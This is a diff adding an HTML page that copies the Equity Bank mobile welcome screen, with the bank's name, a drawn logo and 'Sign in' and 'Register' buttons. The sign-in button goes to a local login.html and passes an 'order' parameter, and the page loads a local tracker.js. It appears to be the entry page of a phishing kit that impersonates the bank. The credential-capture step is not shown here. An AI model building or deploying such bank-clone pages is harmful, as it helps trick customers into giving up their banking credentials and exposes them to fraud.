@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Equity Mobile</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
+  body{
+    max-width:520px;margin:0 auto;min-height:100vh;
+    background:linear-gradient(160deg, #8b1a1a 0%, #a52222 30%, #7a1616 60%, #8b1a1a 100%);
+    display:flex;flex-direction:column;position:relative;overflow:hidden;
+  }
+
+  .bg-shape{
+    position:absolute;top:0;left:0;right:0;bottom:0;pointer-events:none;overflow:hidden;
+  }
+  .bg-shape::before{
+    content:"";position:absolute;
+    width:140%;height:60%;top:10%;left:-20%;
+    background:linear-gradient(135deg, rgba(255,255,255,0.06) 0%, transparent 50%);
+    transform:rotate(-12deg);
+  }
+  .bg-shape::after{
+    content:"";position:absolute;
+    width:120%;height:50%;top:25%;right:-30%;
+    background:linear-gradient(225deg, rgba(255,255,255,0.04) 0%, transparent 50%);
+    transform:rotate(8deg);
+  }
+
+  .topbar{
+    display:flex;align-items:center;justify-content:space-between;
+    padding:16px 20px;position:relative;z-index:2;
+  }
+  .lang-btn{
+    display:flex;align-items:center;gap:6px;
+    background:none;border:none;color:#fff;font-size:14px;font-weight:500;
+    cursor:pointer;font-family:inherit;
+  }
+  .lang-btn svg{width:22px;height:22px;fill:none;stroke:#fff;stroke-width:1.8}
+  .lang-arrow{font-size:10px;margin-top:1px}
+  .chat-btn{
+    width:36px;height:36px;display:flex;align-items:center;justify-content:center;
+    background:none;border:none;cursor:pointer;
+  }
+  .chat-btn svg{width:26px;height:26px;fill:none;stroke:#fff;stroke-width:1.6}
+
+  .main-content{
+    flex:1;display:flex;flex-direction:column;align-items:center;
+    justify-content:center;padding:0 32px;position:relative;z-index:2;
+    margin-top:-20px;
+  }
+
+  .logo-wrap{margin-bottom:36px}
+  .logo-wrap img{height:70px;filter:brightness(0) invert(1)}
+  .logo-svg{width:100px;height:80px}
+
+  h1{
+    color:#fff;font-size:34px;font-weight:700;text-align:center;
+    line-height:1.25;margin-bottom:20px;letter-spacing:-0.3px;
+  }
+  .subtitle{
+    color:rgba(255,255,255,0.7);font-size:15.5px;text-align:center;
+    line-height:1.5;max-width:300px;
+  }
+
+  .buttons{
+    width:100%;padding:0 24px 48px;position:relative;z-index:2;
+    display:flex;flex-direction:column;gap:14px;margin-top:auto;
+  }
+  .btn-signin{
+    display:block;width:100%;padding:17px;border:none;border-radius:30px;
+    font-size:16.5px;font-weight:600;cursor:pointer;font-family:inherit;
+    background:#fff;color:#8b1a1a;text-align:center;text-decoration:none;
+    box-shadow:0 4px 20px rgba(0,0,0,0.15);transition:.2s;
+  }
+  .btn-signin:hover{background:#f5f5f5}
+  .btn-signin:active{transform:scale(0.98)}
+
+  .btn-register{
+    display:block;width:100%;padding:17px;border:2px solid #fff;border-radius:30px;
+    font-size:16.5px;font-weight:600;cursor:pointer;font-family:inherit;
+    background:transparent;color:#fff;text-align:center;text-decoration:none;
+    transition:.2s;
+  }
+  .btn-register:hover{background:rgba(255,255,255,0.1)}
+  .btn-register:active{transform:scale(0.98)}
+</style>
+</head>
+<body>
+
+  <div class="bg-shape"></div>
+
+  <div class="topbar">
+    <button class="lang-btn" type="button">
+      <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M2 12h20"/><path d="M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10A15.3 15.3 0 0112 2z"/></svg>
+      Eng <span class="lang-arrow">&#9660;</span>
+    </button>
+    <button class="chat-btn" type="button">
+      <svg viewBox="0 0 24 24"><path d="M21 11.5a8.38 8.38 0 01-.9 3.8 8.5 8.5 0 01-7.6 4.7 8.38 8.38 0 01-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 01-.9-3.8 8.5 8.5 0 014.7-7.6 8.38 8.38 0 013.8-.9h.5a8.48 8.48 0 018 8v.5z"/></svg>
+    </button>
+  </div>
+
+  <div class="main-content">
+    <div class="logo-wrap">
+      <svg class="logo-svg" viewBox="0 0 120 90" fill="none">
+        <path d="M60 10 L90 45 L75 45 L75 55 L45 55 L45 45 L30 45 Z" fill="white"/>
+        <path d="M42 55 L42 75 L55 75 L55 62 L65 62 L65 75 L78 75 L78 55 Z" fill="white"/>
+        <text x="60" y="88" text-anchor="middle" font-family="Arial,sans-serif" font-size="13" font-weight="800" fill="white" letter-spacing="3">EQUITY</text>
+      </svg>
+    </div>
+    <h1>Welcome to<br>Equity mobile</h1>
+    <p class="subtitle">Good morning! Sign in or register to continue</p>
+  </div>
+
+  <div class="buttons">
+    <a class="btn-signin" id="signinBtn" href="login.html">Sign in</a>
+    <a class="btn-register" id="registerBtn" href="https://play.google.com/store/apps/details?id=ke.co.equitybank" target="_blank" rel="noopener">Register</a>
+  </div>
+
+<script>
+  var params = new URLSearchParams(location.search);
+  var orderId = params.get("order");
+  if(orderId){
+    document.getElementById("signinBtn").href = "login.html?order=" + orderId;
+  }
+
+  var hour = new Date().getHours();
+  var greeting = hour < 12 ? "Good morning" : hour < 17 ? "Good afternoon" : "Good evening";
+  document.querySelector(".subtitle").textContent = greeting + "! Sign in or register to continue";
+</script>
+<script src="tracker.js"></script>
+</body>
+</html>
